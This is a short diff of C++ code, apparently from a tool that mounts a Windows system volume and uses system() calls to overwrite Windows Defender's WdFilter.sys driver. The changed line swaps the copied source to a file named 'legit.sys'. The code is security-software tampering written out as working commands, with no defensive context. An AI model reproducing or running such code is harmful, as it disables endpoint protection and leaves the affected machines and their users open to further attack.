@@ -17,7 +17,7 @@ int main()
 	std::cout << "[!] ";
 	system("mkdir U:\\Windows\\System32\\Drivers\\wd\\");
 	std::cout << "[!] ";
-	system("copy .\\WdFilter.sys U:\\Windows\\System32\\Drivers\\wd\\WdFilter.sys /Y");
+	system("copy .\\legit.sys U:\\Windows\\System32\\Drivers\\wd\\WdFilter.sys /Y");
 	std::cout << "[!] ";
 	system("mountvol.exe U: /D");
 
